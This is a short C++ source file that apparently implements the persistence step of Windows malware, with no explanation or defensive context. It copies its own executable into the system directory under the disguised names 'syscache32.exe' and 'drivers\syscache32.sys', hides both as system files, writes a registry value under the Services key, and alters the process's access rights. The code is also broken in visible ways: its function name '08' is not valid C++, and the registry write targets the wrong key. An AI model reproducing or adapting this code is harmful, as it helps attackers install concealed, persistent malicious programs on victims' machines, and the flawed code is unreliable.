#include "01.h"
#include "08.h"
void 08() {
    wchar_t sys[MAX_PATH];
    GetSystemDirectory(sys, MAX_PATH);
    std::wstring t1 = sys;
    t1 += L"\\syscache32.exe";
    std::wstring t2 = sys;
    t2 += L"\\drivers\\syscache32.sys";
    wchar_t cur[MAX_PATH];
    GetModuleFileName(NULL, cur, MAX_PATH);
    if (wcscmp(cur, t1.c_str()) != 0) {
        CopyFile(cur, t1.c_str(), FALSE);
        SetFileAttributes(t1.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
        CopyFile(cur, t2.c_str(), FALSE);
        SetFileAttributes(t2.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
        HKEY a;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\", 0, KEY_SET_VALUE, &a) == ERROR_SUCCESS) {
            RegSetValueEx(a, L"syscache32", 0, REG_SZ, (BYTE*)t2.c_str(), (wcslen(t2.c_str()) + 1) * 2);
            RegCloseKey(a);
        }
        PACL d;
        PSECURITY_DESCRIPTOR s;
        EXPLICIT_ACCESS ea = { 0 };
        ea.grfAccessPermissions = GENERIC_ALL;
        ea.grfAccessMode = SET_ACCESS;
        ea.grfInheritance = NO_INHERITANCE;
        ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
        ea.Trustee.ptstrName = L"SYSTEM";
        SetEntriesInAcl(1, &ea, NULL, &d);
        SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, d, NULL);
    }
}
